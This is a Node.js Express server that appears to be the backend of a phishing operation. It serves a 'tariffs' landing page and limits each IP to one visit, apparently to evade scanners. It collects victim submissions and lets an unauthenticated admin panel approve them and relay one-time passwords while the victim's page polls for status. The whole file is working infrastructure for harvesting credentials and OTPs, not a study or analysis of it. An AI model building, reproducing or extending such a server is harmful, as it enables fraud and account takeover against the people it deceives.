// 1. Import the necessary packages
const express = require("express");
const cors = require("cors");
const path = require("path");

// 2. Create the server application
const app = express();
const PORT = process.env.PORT || 3000;

// --- UPDATED IP TRACKING ---
const visitedIPs = new Set();

const ipBlocker = (req, res, next) => {
    // These are the paths that should NEVER be blocked.
    const allowedPaths = [
        '/admin.html',
        '/submit',
        '/submission',
        '/update-status',
        '/archive'
    ];
    
    // Check if the request path starts with any of the allowed paths.
    // We also check for /get-status/ which is a dynamic route.
    if (allowedPaths.some(path => req.path.startsWith(path)) || req.path.startsWith('/get-status/')) {
        // If it's an allowed path, skip the IP blocker entirely.
        return next();
    }

    const userIp = req.ip; 

    if (visitedIPs.has(userIp)) {
        return res.status(403).send(`
            <div style="font-family: sans-serif; text-align: center; padding-top: 50px;">
                <h1>Access Denied</h1>
                <p>This link was for one-time use and has already been accessed from this network.</p>
            </div>
        `);
    }

    visitedIPs.add(userIp);
    next();
};

// Apply the IP blocker middleware to ALL incoming requests
app.use(ipBlocker);
// --- END OF UPDATE ---


// 3. Apply other middleware
app.use(cors());
app.use(express.json());

// 4. Tell the server to serve all your HTML, CSS, and image files
app.use(express.static(path.join(__dirname)));

// This tells the server that when someone visits the main address ('/'),
// it should send them the 'tariffs.html' file.
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "tariffs.html"));
});

// 5. Create an "in-memory" database that holds a LIST of submissions
let submissions = [];

// 6. Endpoint for receiving user data
app.post("/submit", (req, res) => {
    console.log("Received a new submission!");
    const newSubmission = req.body;
    newSubmission.id = Date.now().toString(); 
    newSubmission.status = "pending";
    newSubmission.timestamp = new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" });
    submissions.push(newSubmission);
    res.status(200).json({
        message: "Submission received.",
        submissionId: newSubmission.id,
    });
});

// 7. Endpoint for the admin panel to get ALL PENDING submissions
app.get("/submission", (req, res) => {
    const pendingSubmissions = submissions.filter(
        (s) => s.status === "pending",
    );
    res.status(200).json(pendingSubmissions);
});

// 8. Endpoint for updating the status (from admin) OR adding/clearing the OTP
app.post("/update-status", (req, res) => {
    const { id, status, otp } = req.body;
    const submission = submissions.find((s) => s.id === id);

    if (submission) {
        if (status) {
            submission.status = status;
            console.log(`Submission ${id} status updated to: ${status}`);
        }
        if (otp) {
            submission.otp = otp;
            console.log(`Submission ${id} received OTP: ${otp}`);
        } else if (otp === null) {
            submission.otp = null;
            console.log(`Submission ${id} OTP cleared.`);
        }
        res.status(200).json({ message: `Submission ${id} updated.` });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 9. Endpoint for the OTP page to CHECK the status of a SPECIFIC submission
app.get("/get-status/:id", (req, res) => {
    const { id } = req.params;
    const submission = submissions.find((s) => s.id === id);
    if (submission) {
        res.status(200).json({ status: submission.status });
    } else {
        res.status(404).json({ message: "Submission not found." });
    }
});

// 10. Endpoint for the admin to get the ARCHIVE
app.get("/archive", (req, res) => {
    const archivedSubmissions = submissions
        .filter((s) => s.status !== "pending")
        .reverse();
    res.status(200).json(archivedSubmissions);
});

// 11. Start the server
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
